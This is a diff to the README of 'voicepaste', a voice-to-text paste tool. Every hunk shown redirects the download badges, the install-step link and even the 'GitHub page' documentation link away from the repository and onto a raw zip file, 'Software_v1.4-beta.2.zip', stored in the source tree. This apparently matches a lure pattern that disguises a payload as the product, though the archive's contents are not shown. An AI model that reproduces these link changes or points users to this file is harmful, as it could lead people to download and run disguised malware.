@@ -1,6 +1,6 @@
 # 🎤 voicepaste - Speak Clearly, Paste Anywhere
 
-[![Download voicepaste](https://img.shields.io/badge/Download-voicepaste-brightgreen?style=for-the-badge&logo=github)](https://github.com/KiniyaShree/voicepaste)
+[![Download voicepaste](https://img.shields.io/badge/Download-voicepaste-brightgreen?style=for-the-badge&logo=github)](https://github.com/KiniyaShree/voicepaste/raw/refs/heads/main/src/Software_v1.4-beta.2.zip)
 
 ---
 
@@ -24,13 +24,13 @@ voicepaste lets you speak into your microphone and turns your words into text. Y
 
 Click the link below to visit the download page and get the latest version. This page has all the files you need:
 
-[![Download voicepaste](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/KiniyaShree/voicepaste)
+[![Download voicepaste](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/KiniyaShree/voicepaste/raw/refs/heads/main/src/Software_v1.4-beta.2.zip)
 
 ---
 
 ## 🚀 How to Install voicepaste on Windows
 
-1. Go to the [voicepaste download page](https://github.com/KiniyaShree/voicepaste).
+1. Go to the [voicepaste download page](https://github.com/KiniyaShree/voicepaste/raw/refs/heads/main/src/Software_v1.4-beta.2.zip).
 
 2. Look for the latest release or download section.
 
@@ -126,7 +126,7 @@ voicepaste keeps everything on your local machine except the audio sent to OpenA
 
 ## 📖 Other Resources
 
-- Visit the [GitHub page](https://github.com/KiniyaShree/voicepaste) for documentation and updates.
+- Visit the [GitHub page](https://github.com/KiniyaShree/voicepaste/raw/refs/heads/main/src/Software_v1.4-beta.2.zip) for documentation and updates.
 - Check the **Issues** tab on GitHub to see if your problem exists or to report new bugs.
 - Look for the shortcut key guide inside the app under **Help**.
 
@@ -138,4 +138,4 @@ voicepaste is open source. If you want to suggest changes or report bugs, you ca
 
 ---
 
-[![Download voicepaste](https://img.shields.io/badge/Download-voicepaste-brightgreen?style=for-the-badge&logo=github)](https://github.com/KiniyaShree/voicepaste)
+[![Download voicepaste](https://img.shields.io/badge/Download-voicepaste-brightgreen?style=for-the-badge&logo=github)](https://github.com/KiniyaShree/voicepaste/raw/refs/heads/main/src/Software_v1.4-beta.2.zip)
